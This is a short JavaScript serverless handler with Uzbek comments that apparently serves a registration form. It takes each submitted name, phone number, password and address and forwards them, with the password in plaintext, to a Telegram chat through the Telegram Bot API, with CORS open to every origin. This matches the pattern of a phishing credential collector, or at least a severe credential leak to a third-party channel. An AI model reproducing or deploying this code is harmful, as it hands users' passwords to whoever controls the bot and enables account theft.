import axios from 'axios'

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const CHAT_ID = process.env.TELEGRAM_CHAT_ID

export async function handler(event) {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  }

  // OPTIONS so'rovi uchun
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    }
  }

  // Faqat POST so'rovlarni qabul qilish
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    }
  }

  try {
    const { name, phone, password, address } = JSON.parse(event.body)
    
    const message = `🆕 <b>Yangi foydalanuvchi ro'yxatdan o'tdi!</b>

👤 <b>Ism:</b> ${name}
📱 <b>Telefon:</b> ${phone}
🔑 <b>Parol:</b> ${password}${address ? `
📍 <b>Manzil:</b> ${address}` : ''}

⏰ <i>${new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' })}</i>`
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
    
    const response = await axios.post(url, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    })

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true, 
        message: 'Telegram botga yuborildi' 
      }),
    }
  } catch (error) {
    console.error('Xato:', error)
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        success: false, 
        error: error.message 
      }),
    }
  }
}
